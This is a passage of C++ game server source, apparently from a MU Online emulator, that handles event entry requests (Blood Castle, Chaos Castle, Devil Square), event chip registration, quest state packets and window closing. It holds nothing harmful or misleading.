		GCInventoryItemDeleteSend(aIndex, cInvitationItemPos, 1);
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else if ( sitem->m_Type == ITEMGET(13,46) && sitem->m_Durability > 1.0f )
	{
		sitem->m_Durability -= 1.0f;
		GCItemDurSend2(lpObj->m_Index, cInvitationItemPos, sitem->m_Durability, 0);
	}

	lpObj->m_nEventExp = 0;
	lpObj->m_nEventScore = 0;
	lpObj->m_nEventMoney = 0;
	lpObj->m_bDevilSquareIndex = g_DevilSquare.GetDevilSquareIndex(movegateindex);
	lpObj->m_bDevilSquareAuth = true;
	lpObj->m_IfState.state = 0;
	lpObj->m_IfState.type = 0;
	lpObj->m_IfState.use = 0;

	gObjMoveGate(lpObj->m_Index, movegateindex);
	g_DevilSquare.m_DevilSquareGround[cSquareNumber].IncObjCount();
}


void GCReqDevilSquareRemainTime(PMSG_REQ_DEVILSQUARE_REMAINTIME* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_RESULT_DEVILSQUARE_REMAINTIME pResult;

	PHeadSetB((LPBYTE)&pResult, 0x91, sizeof(pResult));
	pResult.RemainTime = 0;

	switch ( lpMsg->hEventType )
	{
		case 5://Illusion
			{
				pResult.hEventType = 5;
				pResult.RemainTime = IllusionTemple.ReqRemainTime();
				pResult.RemainTime_LOW = 0;
				pResult.EnteredUser = 0;
			}break;
		case 1:
			if ( gObj[aIndex].m_PK_Level >= 4 )
			{
				GCServerCmd(aIndex, 0x37, 0, 0);

				LogAddTD("[PK User][DevilSquare] [%s][%s] Move Fail [PK Level:%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level);

				return;
			}

			pResult.hEventType = 1;

			if ( g_DevilSquare.GetState() == DevilSquare_CLOSE )
			{
				pResult.RemainTime = g_DevilSquare.GetRemainTime();
			}
			else if ( g_DevilSquare.GetState() == DevilSquare_OPEN )
			{
				pResult.RemainTime = 0;
			}
			else
			{
				pResult.RemainTime = g_DevilSquare.GetRemainTime() + g_DevilSquare.m_iCloseTime;
			}
			break;

		case 2:
			if ( gObj[aIndex].m_PK_Level >= 4 )
			{
				GCServerCmd(aIndex, 0x38, 0, 0);

				LogAddTD("[PK User][BloodCastle] [%s][%s] Move Fail [PK Level:%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level);

				return;
			}

			pResult.hEventType = 2;

			if ( g_BloodCastle.GetCurrentState(lpMsg->btItemLevel-1) == 1 )
			{
				if ( g_BloodCastle.CheckCanEnter(lpMsg->btItemLevel-1) != false )
				{
					pResult.RemainTime = 0;
				}
				else
				{
					pResult.RemainTime = g_BloodCastle.GetRemainTime(lpMsg->btItemLevel-1);
				}
			}
			else
			{
				pResult.RemainTime = g_BloodCastle.GetRemainTime(lpMsg->btItemLevel-1);
			}
			break;

		case 4:
			if ( gObj[aIndex].m_PK_Level >= 4 )
			{
				GCServerCmd(aIndex, 0x39, 0, 0);

				LogAddTD("[PK User][ChaosCastle] [%s][%s] Move Fail [PK Level:%d]",
					gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_PK_Level);

				return;
			}

			int iENTER_LEVEL =  g_ChaosCastle.GetUserLevelToEnter(aIndex);

			if ( iENTER_LEVEL == -1 )
				return;

			pResult.hEventType = 4;

			if ( g_ChaosCastle.GetCurrentState(iENTER_LEVEL) == 1 )
			{
				if ( g_ChaosCastle.CheckCanEnter(iENTER_LEVEL) != false )
				{
					pResult.RemainTime = 0;
					pResult.RemainTime_LOW = 0;
					pResult.EnteredUser = g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
				}
				else
				{
					WORD wREMAIN_TIME = g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
					pResult.RemainTime = SET_NUMBERH(wREMAIN_TIME);
					pResult.RemainTime_LOW = SET_NUMBERL(wREMAIN_TIME);
					pResult.EnteredUser = g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
				}
			}
			else
			{
				WORD wREMAIN_TIME = g_ChaosCastle.GetRemainTime(iENTER_LEVEL);
				pResult.RemainTime = SET_NUMBERH(wREMAIN_TIME);
				pResult.RemainTime_LOW = SET_NUMBERL(wREMAIN_TIME);
				pResult.EnteredUser = g_ChaosCastle.GetCurEnteredUser(iENTER_LEVEL);
			}
			break;
	}

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}




void AllSendMsg(LPBYTE Msg, int size)
{
	for ( int n=OBJ_STARTUSERINDEX;n<OBJMAX;n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if ( gObj[n].Type == OBJ_USER )
			{
				DataSend(n, Msg, size);
			}
		}
	}
}




void AllSendSameMapMsg(UCHAR * Msg, int size, BYTE mapnumber)
{
	for ( int n=0;n<OBJMAX;n++)
	{
		if ( gObj[n].Connected == PLAYER_PLAYING )
		{
			if ( gObj[n].Type == OBJ_USER )
			{
				if ( gObj[n].MapNumber == mapnumber )
				{
					DataSend(n, Msg, size);
				}
			}
		}
	}
}



struct PMSG_PING
{
	PBMSG_HEAD h;	// C1:71
};



//#unused
void GCSendPing(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_PING pMsgPing;

	PHeadSetB((LPBYTE)&pMsgPing, 0x71, sizeof(pMsgPing));
	gObj[aIndex].iPingTime = GetTickCount();

	DataSend(aIndex, (LPBYTE)&pMsgPing, pMsgPing.h.size);
}



//#unused
void GCPingSendRecv(PMSG_PING_RESULT* aRecv, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	int PingTime = GetTickCount() - gObj[aIndex].iPingTime;

	LogAdd("[%s][%s] Ping = %d ms",
		gObj[aIndex].AccountID, gObj[aIndex].Name, PingTime);
}




struct PMSG_REQ_REGISTER_EVENTCHIP
{
	PBMSG_HEAD h;	// C1:02
	int iINDEX;	// 4
	BYTE Pos;	// 8
	char szUID[11];	// 9
};


struct PMSG_REQ_REGISTER_STONES
{
	PBMSG_HEAD h;	// C1:06
	int iINDEX;	// 4
	BYTE iPosition;	// 8
	char szUID[11];	// 9
};



void GCRegEventChipRecv(PMSG_REGEVENTCHIP* lpMsg, int aIndex)
{
	if ( !EVENCHIP_TYPE_RANGE(lpMsg->Type) )
		return;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->m_IfState.type == 1 )
	{
		LogAddTD("[EventChip] [%s][%s] Attempted ItemCopy using Trade Window",
			lpObj->AccountID, lpObj->Name);

		return;
	}

	if ( lpObj->m_IfState.type == 7 )
	{
		LogAddTD("[EventChip] [%s][%s] Attempted ItemCopy using ChaosBox Window",
			lpObj->AccountID, lpObj->Name);

		return;
	}

	if ( lpObj->UseEventServer != false )
	{
		PMSG_REGEVENTCHIP_RESULT Result;

		PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));
		Result.ChipCount = -1;
		Result.Type = lpMsg->Type;

		LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #1 %d",
			lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);

		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);

		return;
	}

	int Pos = lpMsg->ChipPos + INVENTORY_BAG_START;
	CItem * sitem = &lpObj->pInventory[Pos];

	if ( !sitem->IsItem() )
	{
		PMSG_REGEVENTCHIP_RESULT Result;

		PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));
		Result.ChipCount = -1;
		Result.Type = lpMsg->Type;

		LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #2 %d",
			lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);

		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);

		return;
	}

	lpObj->UseEventServer = true;

	switch ( lpMsg->Type )
	{
		case 0x00:
			if ( sitem->m_Type == ITEMGET(14,21) && sitem->m_Level == 0 ) // Rena
			{
				PMSG_REQ_REGISTER_EVENTCHIP pMsg;

				PHeadSetB((LPBYTE)&pMsg, 0x02, sizeof(pMsg));
				pMsg.iINDEX = aIndex;
				pMsg.Pos = Pos;
				strcpy(pMsg.szUID, lpObj->AccountID);

				DataSendEventChip((PCHAR)&pMsg, sizeof(pMsg));
			}
			else
			{
				PMSG_REGEVENTCHIP_RESULT Result;

				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));
				Result.ChipCount = -1;
				Result.Type = 0x00;

				LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #3 %d",
					lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);

				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);
				lpObj->UseEventServer = false;
			}
			break;
		case 0x01:
			if ( sitem->m_Type == ITEMGET(14,21) && sitem->m_Level == 1 ) // Stone
			{
				PMSG_REQ_REGISTER_STONES pMsg;

				PHeadSetB((LPBYTE)&pMsg, 0x06, sizeof(pMsg));
				pMsg.iINDEX = aIndex;
				pMsg.iPosition = Pos;
				strcpy(pMsg.szUID, lpObj->AccountID);

				DataSendEventChip((PCHAR)&pMsg, sizeof(pMsg));

				LogAddTD("[Stone] [%s][%s] Register Stone (Stone Pos:%d, Serial:%d)",
					lpObj->AccountID, lpObj->Name, lpMsg->ChipPos, sitem->m_Number);
			}
			else
			{
				PMSG_REGEVENTCHIP_RESULT Result;

				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));
				Result.ChipCount = -1;
				Result.Type = 0x01;

				LogAddTD("[Stone] [%s][%s] Not Found EventChip (Stone Pos: %d)",
					lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);

				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);
				lpObj->UseEventServer = false;
			}
			break;
		default:
			lpObj->UseEventServer = false;
			break;
	}
}


struct PMSG_REQ_REGISTER_MUTONUM
{
	PBMSG_HEAD h;	// C1:03
	int iINDEX;	// 4
	char szUID[11];	// 8
};


void GCGetMutoNumRecv(PMSG_GETMUTONUMBER* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].MutoNumber != 0 )
	{
		char msg[255];
		wsprintf(msg, "¿ÃπÃ ∑Á∞°µÂ¿« º˝¿⁄∞° ¿÷Ω¿¥œ¥Ÿ");
		GCServerMsgStringSend(msg, aIndex, 1);
		return;
	}

	if ( gObj[aIndex].UseEventServer != false )
		return;

	gObj[aIndex].UseEventServer = true;

	if ( !gObjFind10EventChip(aIndex) )
	{
		PMSG_GETMUTONUMBER_RESULT Result;

		PHeadSetB((LPBYTE)&Result, 0x96, sizeof(Result));
		Result.MutoNum[0] = -1;
		Result.MutoNum[1] = 0;
		Result.MutoNum[2] = 0;

		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);
		gObj[aIndex].UseEventServer = false;

		return;
	}

	PMSG_REQ_REGISTER_MUTONUM pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x03, sizeof(pMsg));
	pMsg.iINDEX = aIndex;
	strcpy(pMsg.szUID, gObj[aIndex].AccountID);

	DataSendEventChip((PCHAR)&pMsg, sizeof(pMsg));

	LogAddTD("[EventChip] [%s][%s] Request MutoNumber",
		gObj[aIndex].AccountID, gObj[aIndex].Name);
}




void GCUseEndEventChipRescv(int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddC(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		return;
	}

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 9 )
	{
		gObj[aIndex].m_IfState.state = 0;
		gObj[aIndex].m_IfState.type = 0;
		gObj[aIndex].m_IfState.use = 0;
	}
}


struct PMSG_REQ_RESET_EVENTCHIP
{
	PBMSG_HEAD h;	// C1:[04:Rena] [09:Stone]
	int iINDEX;	// 4
	char szUID[11];	// 8
};


void GCUseRenaChangeZenRecv(PMSG_EXCHANGE_EVENTCHIP* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].UseEventServer )
		return;

	gObj[aIndex].UseEventServer = true;

	PMSG_REQ_RESET_EVENTCHIP pMsg;

	if ( lpMsg->btType == 1 )	// Stone?
		PHeadSetB((LPBYTE)&pMsg, 0x09, sizeof(pMsg));
	else
		PHeadSetB((LPBYTE)&pMsg, 0x04, sizeof(pMsg));

	pMsg.iINDEX = aIndex;
	strcpy(pMsg.szUID, gObj[aIndex].AccountID);

	DataSendEventChip((PCHAR)&pMsg, sizeof(pMsg));

	if ( lpMsg->btType == 0x01 )
		LogAddTD("[EventChip] [%s][%s] Request Change Stones", gObj[aIndex].AccountID, gObj[aIndex].Name);
	else
		LogAddTD("[EventChip] [%s][%s] Request Change Rena", gObj[aIndex].AccountID, gObj[aIndex].Name);
}


struct PMSG_SEND_QuestINFO
{
	PBMSG_HEAD h;	// C1:A0
	BYTE Count;	// 3
	BYTE State[50];	// 4
};


void CGRequestQuestInfo(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->m_SendQuestInfo != 0 )
		return;

	int questcount = g_QuestInfo.GetQuestCount();
	int foundquest = 0;

	PMSG_SEND_QuestINFO pMsg;
	LPQUEST_INFO lpQuestInfo;

	memcpy(pMsg.State, lpObj->m_Quest, sizeof(pMsg.State));

	int i=0;
	for ( i=0;i<MAX_QUEST_INFO;i++)
	{
		lpQuestInfo = g_QuestInfo.GetQuestInfo(i);

		if ( lpQuestInfo )
		{
			foundquest++;

			if ( foundquest == questcount )
			{
				break;
			}
		}
	}

	int iSize = i/4+5;

	PHeadSetB((LPBYTE)&pMsg, 0xA0, iSize);
	pMsg.Count = i;
	DataSend(aIndex, (LPBYTE)&pMsg, iSize);
	lpObj->m_SendQuestInfo = true;
}




void GCSendQuestInfo(int aIndex, int QuestIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	CGRequestQuestInfo(aIndex);
	LPOBJ lpObj = &gObj[aIndex];
	PMSG_SETQUEST pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0xA1, sizeof(pMsg));
	pMsg.QuestIndex = QuestIndex;
	pMsg.State = g_QuestInfo.GetQuestStateBYTE(lpObj, QuestIndex);

	if ( pMsg.State != 0 )
		DataSend(aIndex, (UCHAR*)&pMsg, sizeof(pMsg));
}



struct PMSG_SETQUEST_RESULT
{
	PBMSG_HEAD h;	// C1:A2
	BYTE QuestIndex;	// 3
	BYTE Result;	// 4
	BYTE State;	// 5
};



void CGSetQuestState(PMSG_SETQUEST* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_SETQUEST_RESULT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0xA2, sizeof(pMsg));
	pMsg.QuestIndex = lpMsg->QuestIndex;
	pMsg.Result = g_QuestInfo.SetQuestState(lpObj, lpMsg->QuestIndex, lpMsg->State);
	pMsg.State = g_QuestInfo.GetQuestStateBYTE(lpObj, lpMsg->QuestIndex);

	DataSend(aIndex, (UCHAR*)&pMsg, sizeof(pMsg));
}



struct PMSG_SETQUEST_PRIZE
{
	PBMSG_HEAD h;	// C1:A3
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	BYTE Type;	// 5
	BYTE Count;	// 6
};



void GCSendQuestPrize(int aIndex, BYTE Type, BYTE Count)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	CGRequestQuestInfo(aIndex);
	LPOBJ lpObj = &gObj[aIndex];

	PMSG_SETQUEST_PRIZE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0xA3, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(lpObj->m_Index);
	pMsg.NumberL = SET_NUMBERL(lpObj->m_Index);
	pMsg.Type = Type;
	pMsg.Count = Count;

	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
	MsgSendV2(lpObj, (LPBYTE)&pMsg, sizeof(pMsg));
}




void CGCloseWindow(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type )
	{
		if ( gObj[aIndex].m_IfState.type == 7 )
			return;

		if ( gObj[aIndex].m_IfState.type == 10 && gObj[aIndex].TargetShopNumber == 229 )	// Marlon
		{
			gQuestNpcTeleport.TalkRefDel();
			gObj[aIndex].TargetShopNumber = -1;
		}

		if ( gObj[aIndex].m_IfState.type == 10 && gObj[aIndex].TargetShopNumber == 568 )	// Wandering Merchant Zyro
		{
			gQuestNpcTeleport.TalkRefDel();
			gObj[aIndex].TargetShopNumber = -1;
		}

		if ( gObj[aIndex].m_IfState.type == 3 )
		{
			gObj[aIndex].TargetShopNumber = -1;
		}

		if ( gObj[aIndex].m_IfState.type == 1 )
		{
			CGTradeCancelButtonRecv(aIndex);
		}

		if ( gObj[aIndex].m_IfState.type == 6 )
		{
			CGWarehouseUseEnd(aIndex);
		}

		if ( gObj[aIndex].m_IfState.type == 13 )
		{
			ChaosBoxInit(&gObj[aIndex]);
			gObjInventoryCommit(aIndex);
		}

		//INIT CHAOS BOX HERE
		//ChaosBoxInit(&gObj[aIndex]);
		gObj[aIndex].m_IfState.state = 0;
		gObj[aIndex].m_IfState.type = 0;
		gObj[aIndex].m_IfState.use = 0;
		LogAddTD("[CloseWindow] [%s][%s] Closing Window 1", gObj[aIndex].AccountID, gObj[aIndex].Name);
	}

	LogAddTD("[CloseWindow] [%s][%s] Closing Window 2", gObj[aIndex].AccountID, gObj[aIndex].Name);

}


struct PMSG_RESULT_MOVEBLOODCASTLE
{
	PBMSG_HEAD h;	// C1:9A
	BYTE Result;	// 3
};


void CGRequestEnterBloodCastle(PMSG_REQ_MOVEBLOODCASTLE* lpMsg, int iIndex)
{
	if ( !OBJMAX_RANGE(iIndex))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}
	
	BYTE btBridgeNumber = lpMsg->iBridgeNumber - 1;
	BYTE btInvisibleCourtItemPos = lpMsg->iItemPos;
	int iITEM_LEVEL = 0;
	DWORD dwITEM_SERIAL = 0;
	PMSG_RESULT_MOVEBLOODCASTLE pResult;

	PHeadSetB((LPBYTE)&pResult, 0x9A, sizeof(pResult));
	pResult.Result = 0;

	if ( gObj[iIndex].Type != OBJ_USER || gObj[iIndex].Connected <= PLAYER_LOGGED )
		return;

	if ( gObj[iIndex].m_IfState.use && gObj[iIndex].m_IfState.type != 12 )
		return;

	if ( gObj[iIndex].m_PK_Level >= 4 )
	{
		pResult.Result = 7;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( g_BloodCastle.CheckCanEnter(btBridgeNumber) == false )
	{
		pResult.Result = 2;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( gObj[iIndex].pInventory[btInvisibleCourtItemPos].IsItem() == TRUE )
	{
		if ( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == ITEMGET(13,18) )
		{
			iITEM_LEVEL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Level;
			dwITEM_SERIAL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Number;
			
			if ( BC_CLOACK_LEVEL_RANGE(iITEM_LEVEL)==FALSE)	// #error
			{
				pResult.Result = 1;
				DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
		else if ( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == ITEMGET(13,47) &&
				  gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability > 0.0f ) //#unk
		{
			for ( int i=0;i<MAX_CLOACK_LEVEL;i++)
			{
				if ( g_BloodCastle.CheckEnterLevel(iIndex, i+1) == 0 )	// #error
				{
					iITEM_LEVEL = i+1;
					break;
				}
			}

			dwITEM_SERIAL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Number;

			if ( BC_CLOACK_LEVEL_RANGE(iITEM_LEVEL) == FALSE )
			{
				pResult.Result = 1;
				DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
		else
		{
			pResult.Result = 1;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else
	{
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	
	int iRESULT = g_BloodCastle.CheckEnterLevel(iIndex, iITEM_LEVEL);

	if ( iRESULT== 0 )
	{
		pResult.Result = 0;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else 
	{
		if ( iRESULT == -1 )
		{
			pResult.Result = 4;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}

		if ( iRESULT == 1 )
		{
			pResult.Result = 3;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}

		return;
	}
		
	int iBC_INDEX = g_BloodCastle.EnterUserBridge(iITEM_LEVEL-1, iIndex);

	if ( iBC_INDEX == -1 )
	{
		pResult.Result = 5;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( (gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == ITEMGET(13,18) ||
		(gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == ITEMGET(13,47)) &&
		gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability == 1.0f ))
	{
		gObjInventoryDeleteItem(iIndex, btInvisibleCourtItemPos);
		GCInventoryItemDeleteSend(iIndex, btInvisibleCourtItemPos, 1);
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else if (gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == ITEMGET(13,47) && gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability > 1.0f )
	{
		gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability -= 1.0f;
		GCItemDurSend2(iIndex, btInvisibleCourtItemPos, gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability, 0);
	}

	gObj[iIndex].m_cBloodCastleIndex = iITEM_LEVEL-1;
	gObj[iIndex].m_cBloodCastleSubIndex = iBC_INDEX;
	gObj[iIndex].m_iBloodCastleEXP = 0;
	gObj[iIndex].m_IfState.state = 0;
	gObj[iIndex].m_IfState.type = 0;
	gObj[iIndex].m_IfState.use = 0;

	g_BloodCastle.SearchUserDeleteQuestItem(iIndex);
	char szTemp[256];
	wsprintf(szTemp, lMsg.Get(MSGGET(4, 147)), iITEM_LEVEL);
	GCServerMsgStringSend(szTemp, iIndex, 1);

	switch ( iITEM_LEVEL )
	{
		case 1:
			gObjMoveGate(iIndex, 66);
			break;
		case 2:
			gObjMoveGate(iIndex, 67);
			break;
		case 3:
			gObjMoveGate(iIndex, 68);
			break;
		case 4:
			gObjMoveGate(iIndex, 69);
			break;
		case 5:
			gObjMoveGate(iIndex, 70);
			break;
		case 6:
			gObjMoveGate(iIndex, 71);
			break;
		case 7:
			gObjMoveGate(iIndex, 80);
			break;
		case 8:
			gObjMoveGate(iIndex, 271);
			break;
	}

	LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%d)",
		iITEM_LEVEL, gObj[iIndex].AccountID, gObj[iIndex].Name, dwITEM_SERIAL);
}



struct PMSG_RESULT_MOVECHAOSCASTLE
{
	PBMSG_HEAD2 h;	// C1:AF:01
	BYTE Result;	// 4
};



void CGRequestEnterChaosCastle(PMSG_REQ_MOVECHAOSCASTLE* lpMsg, int iIndex)
{
	if ( !OBJMAX_RANGE(iIndex))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	BYTE btGuardMailSetItemPos = lpMsg->iItemPos;
	int iITEM_LEVEL=0;
	DWORD dwITEM_SERIAL=0;
	PMSG_RESULT_MOVECHAOSCASTLE pResult;

	PHeadSubSetB((LPBYTE)&pResult, 0xAF, 0x01, sizeof(pResult));
	pResult.Result = 0;

	if ( gObj[iIndex].Type != OBJ_USER || gObj[iIndex].Connected <= PLAYER_LOGGED )
		return;

	if ( BC_MAP_RANGE(gObj[iIndex].MapNumber) ||
	 	 CC_MAP_RANGE(gObj[iIndex].MapNumber) ||
		 IT_MAP_RANGE(gObj[iIndex].MapNumber) ||
#if (PACK_EDITION>=2)
		 IMPERIALGUARDIAN_MAP_RANGE(gObj[iIndex].MapNumber) ||
#endif
#if (PACK_EDITION>=3)
		 DG_MAP_RANGE(gObj[iIndex].MapNumber) ||
#endif
		 DS_MAP_RANGE(gObj[iIndex].MapNumber) )
	{
		PMSG_NOTICE pNotice;
		pNotice.type = 0;	// 3
		pNotice.btCount = 0;	// 4
		pNotice.wDelay = 0;	// 6	
		pNotice.dwColor = 0;	// 8
		pNotice.btSpeed = 0;	// C
		TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 200)));
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}

	if ( gObj[iIndex].m_IfState.use && gObj[iIndex].m_IfState.type != 12 )
		return;

	if ( PvP.gPkLimitFree == FALSE )
	{
		if ( gObj[iIndex].m_PK_Level >= 5 )
		{
			PMSG_NOTICE pNotice;
			pNotice.type = 0;	// 3
			pNotice.btCount = 0;	// 4
			pNotice.wDelay = 0;	// 6	
			pNotice.dwColor = 0;	// 8
			pNotice.btSpeed = 0;	// C
			TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 201)));
			DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
			return;
		}
	}

	if ( gObj[iIndex].m_PK_Level >= 4 )
	{
		pResult.Result = 8;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( g_DuelManager.gObjDuelCheck(&gObj[iIndex]) == TRUE )
	{
		PMSG_NOTICE pNotice;
		pNotice.type = 0;	// 3
		pNotice.btCount = 0;	// 4
		pNotice.wDelay = 0;	// 6	
		pNotice.dwColor = 0;	// 8
		pNotice.btSpeed = 0;	// C
		TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 202)));
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}

	if ( gObj[iIndex].lpGuild )
	{
		if ( gObj[iIndex].lpGuild->WarState == 1 )
		{
			PMSG_NOTICE pNotice;
			pNotice.type = 0;	// 3
			pNotice.btCount = 0;	// 4
			pNotice.wDelay = 0;	// 6	
			pNotice.dwColor = 0;	// 8
			pNotice.btSpeed = 0;	// C
			TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 203)));
			DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
			return;
		}
	}

	if ( gObj[iIndex].pInventory[8].m_Type == ITEMGET(13,3) ||	// Dino
		 gObj[iIndex].pInventory[8].m_Type == ITEMGET(13,2) ||	// Uniria
		 gObj[iIndex].pInventory[8].m_Type == ITEMGET(13,37) )	// Fenrir
	{
		PMSG_NOTICE pNotice;
		pNotice.type = 0;	// 3
		pNotice.btCount = 0;	// 4
		pNotice.wDelay = 0;	// 6	
		pNotice.dwColor = 0;	// 8
		pNotice.btSpeed = 0;	// C
		TNotice::MakeNoticeMsgEx(&pNotice, 1, lMsg.Get(MSGGET(4, 204)));
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}

	int iENTER_LEVEL = g_ChaosCastle.GetUserLevelToEnter(iIndex);

	if ( iENTER_LEVEL == -1 )
	{
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( g_ChaosCastle.CheckCanEnter(iENTER_LEVEL) == false )
	{
		pResult.Result = 2;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( gObj[iIndex].pInventory[btGuardMailSetItemPos].IsItem() == TRUE )
	{
		if ( gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Type == ITEMGET(13,29) ||		// Armor of Guardman
			(gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Type == ITEMGET(13,121) &&	// Open Access Ticket to Chaos
			 gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Durability > 0))
		{
			iITEM_LEVEL = gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Level;
			dwITEM_SERIAL = gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Number;
		}
		else
		{
			pResult.Result = 1;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else
	{
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( g_ChaosCastle.CheckWearingMOPH(iIndex) == TRUE )
	{
		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 205)), iIndex, 1);
		return;
	}

	int iBC_INDEX = -1;

	if ( g_ChaosCastle.CheckUserEnterMoney(iIndex, iENTER_LEVEL) )
	{
		iBC_INDEX = g_ChaosCastle.EnterUserChaosCastle(iENTER_LEVEL, iIndex);

		if ( iBC_INDEX == -1 )
		{
			pResult.Result = 5;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else
	{
		pResult.Result = 7;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	BOOL bRES = g_ChaosCastle.PayUserEnterMoney(iIndex, iENTER_LEVEL);

	if ( bRES == FALSE )
	{
